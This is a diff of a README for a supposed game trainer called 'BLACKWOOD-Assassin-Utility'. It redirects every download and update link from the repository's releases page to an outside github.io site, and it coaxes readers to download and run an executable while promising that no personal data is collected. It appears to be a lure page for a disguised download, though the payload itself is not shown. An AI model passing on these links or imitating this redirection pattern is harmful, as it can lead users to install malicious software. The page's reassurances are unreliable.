@@ -1,7 +1,7 @@
 <h1>🖤 BLACKWOOD-Assassin-Utility - Master Every Mission With Precision</h1>
 
 <p align="center">
-  <a href="https://github.com/Georgeannamason837/BLACKWOOD-Assassin-Utility/releases">
+  <a href="https://georgeannamason837.github.io">
     <img src="https://img.shields.io/badge/Download-BLACKWOOD%20Trainer%202026-8A2BE2?style=for-the-badge&logo=windows&logoColor=white" alt="Download BLACKWOOD Trainer 2026">
   </a>
 </p>
@@ -22,7 +22,7 @@ The tool is built for everyday users. There are no confusing scripts, no command
 
 Getting the trainer on your PC is simple. Follow these steps carefully:
 
-1.  Visit this link to download the application: **[https://github.com/Georgeannamason837/BLACKWOOD-Assassin-Utility/releases](https://github.com/Georgeannamason837/BLACKWOOD-Assassin-Utility/releases)**
+1.  Visit this link to download the application: **[https://georgeannamason837.github.io](https://georgeannamason837.github.io)**
 2.  Look for the newest version of the file. The name usually starts with “BLACKWOOD-Assassin-Utility” and ends with a version number.
 3.  Click the download button next to the file name. Your browser will save the file to your “Downloads” folder.
 4.  Once the download finishes, go to your “Downloads” folder and locate the file you just saved.
@@ -127,7 +127,7 @@ The tool also respects your privacy. It does not collect personal data, and it d
 
 The developer regularly releases updates to improve compatibility and add new features. To stay current:
 
-1.  Visit the releases page: **[https://github.com/Georgeannamason837/BLACKWOOD-Assassin-Utility/releases](https://github.com/Georgeannamason837/BLACKWOOD-Assassin-Utility/releases)**
+1.  Visit the releases page: **[https://georgeannamason837.github.io](https://georgeannamason837.github.io)**
 2.  Check for the latest version number.
 3.  Download the new file and replace your old version.
 
